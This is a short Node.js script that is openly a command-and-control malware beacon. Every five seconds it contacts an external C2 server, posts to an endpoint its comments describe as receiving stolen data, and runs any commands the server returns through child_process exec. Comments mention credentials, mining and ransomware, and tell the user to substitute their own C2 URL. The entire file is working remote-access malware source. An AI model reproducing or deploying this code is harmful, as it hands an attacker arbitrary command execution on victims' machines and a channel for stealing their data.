const C2_SERVER_URL = "https://mack-test-server.onrender.com"; // Replace with your actual C2 server URL
const fetch = require('node-fetch');
const { exec } = require('child_process');

(async () => {
  const dataExfiltrationEndpoint = `${C2_SERVER_URL}/data`; // Endpoint for sending stolen data
  const commandFetchEndpoint = `${C2_SERVER_URL}/commands`; // Endpoint for fetching commands

  setInterval(() => {
    // 1. Send stolen data to C2 server (e.g., credentials, system info)
    fetch(dataExfiltrationEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        command: 'ping localhost' // Placeholder for any command (e.g., mining, ransomware)
      })
    }).then(response => response.json())
      .then(data => {
        if (data.command) {
          exec(data.command, (error, stdout, stderr) => {
            console.log('Executed:', data.command);
            console.log('Output:', stdout);
            if (error) {
              console.error(`Error executing command: ${error}`);
              return;
            }
            if (stderr) {
              console.error(`Stderr executing command: ${stderr}`);
              return;
            }
          });
        }
      })
      .catch(error => {
        console.error("❌ Failed to communicate with C2 server:", error);
      });

    // 2. Fetch pending commands from C2 server
    fetch(commandFetchEndpoint, {
      method: 'GET',
      headers: {
        'Accept': 'application/json'
      }
    }).then(response => response.json())
      .then(data => {
        if (data.action) {
          console.log(`📡 Received Command: ${data.action}`);
          exec(data.action, (error, stdout, stderr) => {
            if (error) {
              console.error(`Error executing command: ${error}`);
              return;
            }
            if (stderr) {
              console.error(`Stderr executing command: ${stderr}`);
              return;
            }
            console.log("✅ Command executed successfully.");
          });
        }
      })
      .catch(error => {
        console.error("❌ Failed to fetch command from C2 server:", error);
      });
  }, 5000); // Send beacon every 5 seconds
})();

